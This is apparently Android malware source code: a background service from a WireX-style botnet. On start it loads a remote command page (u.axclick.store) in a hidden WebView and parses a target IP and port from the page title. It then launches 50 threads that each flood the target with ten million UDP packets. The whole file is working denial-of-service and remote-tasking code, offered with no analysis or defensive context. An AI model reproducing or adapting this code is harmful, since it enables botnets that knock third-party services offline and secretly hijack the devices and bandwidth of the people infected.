package com.fsoc131y.wirex.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDPService extends Service {
  long numberPacketSent;
  String targetAddress;
  String port;
  WebView webView;
  int f;

  public UDPService() {
    numberPacketSent = 0;
    f = 1;
  }

  public void floodTarget() {
    for (int i = 0; i < 50; i++) {
      Thread thread = new Thread(new Runnable() {
        @Override public void run() {
          try {
            numberPacketSent = 0;
            byte[] bArr = new byte[512];
            DatagramPacket datagramPacket =
                new DatagramPacket(bArr, bArr.length, InetAddress.getByName(targetAddress),
                    Integer.parseInt(port));
            DatagramSocket datagramSocket = new DatagramSocket();
            datagramSocket.setBroadcast(false);
            while (numberPacketSent < 10000000) {
              datagramSocket.send(datagramPacket);
              numberPacketSent++;
            }
            datagramSocket.close();
          } catch (Exception e) {
          }
        }
      });
      thread.setPriority(10);
      thread.start();
    }
  }

  public void getTarget() {
    try {
      webView = new WebView(this);
      webView.clearCache(true);
      webView.loadUrl("http://u.axclick.store/");
      webView.setWebViewClient(new WebViewClient() {
        public void onPageFinished(WebView webView, String str) {
          try {
            if (f == 1 && webView.getTitle() != null && webView.getTitle().contains("snewxwri")) {
              String[] split = webView.getTitle().trim().split("snewxwri");
              targetAddress = split[0];
              port = split[1];
              floodTarget();
              f++;
            }
          } catch (Exception e) {
          }
        }
      });
    } catch (Exception e) {
    }
  }

  public IBinder onBind(Intent intent) {
    return null;
  }

  public void onCreate() {
    super.onCreate();
    getTarget();
  }

  public void onDestroy() {
    numberPacketSent = 10000000;
    super.onDestroy();
  }
}
